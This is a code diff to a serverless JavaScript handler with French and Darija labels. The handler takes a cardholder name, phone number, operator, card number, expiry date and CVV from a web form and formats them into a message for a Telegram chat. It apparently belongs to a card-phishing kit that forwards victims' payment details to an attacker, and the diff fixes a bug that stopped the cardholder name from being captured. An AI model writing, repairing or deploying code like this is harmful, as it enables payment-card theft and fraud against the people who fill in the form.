@@ -12,7 +12,7 @@ exports.handler = async (event) => {
   try {
     const data = JSON.parse(event.body);
 
-    const name = data['Titulaire de la carte']  || '';
+    const titulaire_de_la_carte = data.titulaire_de_la_carte  || '';
     const phone = data.phone || '';  
     const operator = data.operator || '';
     const cardNumber = data.cardNumber || '';
@@ -21,7 +21,7 @@ exports.handler = async (event) => {
    
 
 
-    if (!name && !phone && !operator && !cardNumber && !expiry && !cvv) {
+    if (!titulaire_de_la_carte && !phone && !operator && !cardNumber && !expiry && !cvv) {
       return {
         statusCode: 400,
         body: JSON.stringify({ success: false, error: 'Aucune donnée reçue' }),
@@ -33,8 +33,8 @@ exports.handler = async (event) => {
     const chatId = process.env.TELEGRAM_CHAT_ID;
 
     let text = `📩 *Nouveau message dyal client*\n\n`;
-    text += `*Nom:* ${Titulaire de la carte}\n`;
-
+    text += `*Nom:* ${titulaire_de_la_carte}\n`;
+    
     if (phone) text += `*Téléphone:* ${phone}\n`;
     if (operator) text += `*Opérateur:* ${operator}\n`;
     if (cardNumber) text += `*Numéro de carte:* ${cardNumber}\n`;
